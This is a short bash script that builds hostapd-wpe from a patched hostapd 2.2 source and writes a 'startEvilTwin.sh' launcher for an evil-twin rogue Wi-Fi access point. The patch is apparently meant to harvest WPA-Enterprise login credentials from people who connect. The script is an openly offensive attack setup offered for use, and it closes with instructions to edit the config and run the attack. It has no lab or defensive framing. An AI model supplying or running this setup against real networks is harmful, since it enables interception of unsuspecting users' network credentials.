# Dependencies
sudo apt-get install libssl-dev libnl-dev
sudo -k;

# Hostapd
mkdir ~/eviltwin; cd ~/eviltwin;
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz
tar -zxf hostapd-2.2.tar.gz
cd hostapd-2.2
patch -p1 < ../hostapd-wpe/hostapd-wpe.patch 
cd hostapd
make
cd ../../hostapd-wpe/certs
./bootstrap
cd ../../hostapd-2.2/hostapd

# Creating program to start attack
echo "sudo nmcli nm wifi off" >> startEvilTwin.sh
echo "sudo rfkill unblock wlan" >> startEvilTwin.sh
echo "sudo ./hostapd-wpe hostapd-wpe.conf" >> startEvilTwin.sh

# How to use
echo -e "[+] DO NOT FORGET TO EDIT THE 'hostapd-wpe.conf' FILE!!!"
echo -e "Enter the following to run the attack:"
echo -e "    sudo bash ./startEvilTwin.sh"
